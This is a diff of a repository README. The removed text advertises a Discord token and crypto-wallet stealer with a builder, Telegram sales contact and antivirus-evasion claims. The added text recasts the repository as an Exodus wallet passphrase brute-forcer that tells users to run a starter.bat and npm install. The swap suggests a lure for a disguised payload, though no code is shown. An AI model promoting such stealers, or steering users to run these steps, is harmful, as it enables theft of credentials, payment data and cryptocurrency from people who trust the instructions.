@@ -1,52 +1,44 @@
+<h1 align="center" id="title">Exodus Passphrase Extractor 🔑</h1>
 
+<p>This script is designed to <strong>extract the passphrase from your Exodus wallet 💼</strong> by attempting various passwords that you provide. It works by testing each password from a <code>passwords.txt</code> file and if it finds the correct one it decrypts the wallet and retrieves the passphrase.   (To get started, download nodejs and then launch starter.bat)</p>
 
-#####  [:gem: Premium](t.me/dxlstealer) - [🔧 Builder](t.me/dxlstealer) [💡 Features](t.me/dxlstealer) 
+### **How It Works 🤔:**
 
-### Contact
-http://t.me/dxlstealer
+1.  The script reads the encrypted wallet data from a `.seco` file.
+2.  It then tries each password from the provided list (`passwords.txt`).
+3.  If a password is correct it decrypts the file extracts the passphrase and returns it.
+4.  If no password matches it will notify you that no matching password was found.
+tehere's already a real `seed.seco` and one of the password of `passwords.txt` to test out the script.
+  
 
-# bbystealer
-The new modern discord token grabber & token stealer, with discord password & token even when it changes
+### **Requirements 📋:**
 
-1- Python + nodejs Dowload
+*   A `passwords.txt` file containing potential passwords to "bruteforce" (line by line).
+*   `seed.seco` file containing your encrypted passphrase.
 
-2- your webhook replace for webhook url.txt
+  
 
-3- run install.py
+### **Where to Find the `seed.seco` File 📂:**
 
-4- Run builder.lnk
+<p>You can obtain the <code>seed.seco</code> file by navigating to the following directory on your computer: <code>%appdata%/Exodus/exodus.wallet</code>.</p>
 
+### **Important Notes 📝:**
 
-# Features
-- QRCode logger 
-- Discord Login Stealer
-  - Username
-  - ID
-  - Token
-  - Password (even when it changes)
-  - Email
-  - Badges
-  - Nitro
-  - Credit Card number
-  - CVC
-  - Expiration
-  - Billing
-- IP
-- Computer Hostname
-- Instantly logout
-- Disable QR
-- Custom embed
-- Cool code structure
-- Cookies (Chrome bypass)❤️‍🔥
-- Password 
-- Cookie Automatic Logger 
-- Metamask stealer 
-- Exodus stealer 
-- Anti-Delete & Anti-Spam 
-- 0/64 Detections 
-- 69 wallets Stealer 
-- browser wallets🔥
+*   Please ensure you have a legitimate reason to recover your wallet 🔍.
+*   This tool is intended for **personal use only 🔒**.
 
-# DISCLAIMER
+  
 
-bby stealer > pirate stealer
+<h2>🛠️ Installation Steps:</h2>
+
+<p>1. Install all required modules (it will automatically install good versions)  (RUN STARTER.BAT AFTER INSTALLATION IS COMPLETE)</p>
+
+```
+npm i
+```
+
+<p>2. Run the script</p>
+
+```
+node index.js
+```
